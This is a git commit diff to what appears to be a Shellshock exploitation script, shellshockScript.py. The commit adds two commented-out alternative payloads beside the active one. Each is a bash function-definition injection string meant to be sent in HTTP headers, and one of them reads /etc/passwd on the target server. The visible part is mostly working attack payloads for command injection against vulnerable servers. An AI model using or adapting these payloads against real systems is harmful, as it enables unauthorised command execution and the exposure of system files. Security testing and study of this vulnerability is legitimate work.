9d6ab0f5b9f4e5497e4099482fea89d813892cf6
Martin Barker <84631290+mdb-dev-io@users.noreply.github.com>
2024-03-12 09:52:04 +0000

    Update shellshockScript.py

--- shellshockScript.py
+++ shellshockScript.py
@@ -22,6 +22,8 @@ def send_request_with_header(url, header_name, payload, proxy, file):
 def main(headers_file, url, proxy):
     # Define the Shellshock payload change this using full binary paths if you want a different payload to run e.g /bin/whoami
     payload = "() { :; }; echo; echo; /bin/cat /etc/passwd bash -s :''"
+    # payload = "() { :; }; echo; echo; /whoami bash -s :''"
+    # payload = "() { :; }; echo; echo; /bin/cat /etc/passwd"
 
     # Open the file to save responses
     with open("responses.txt", "w") as file:
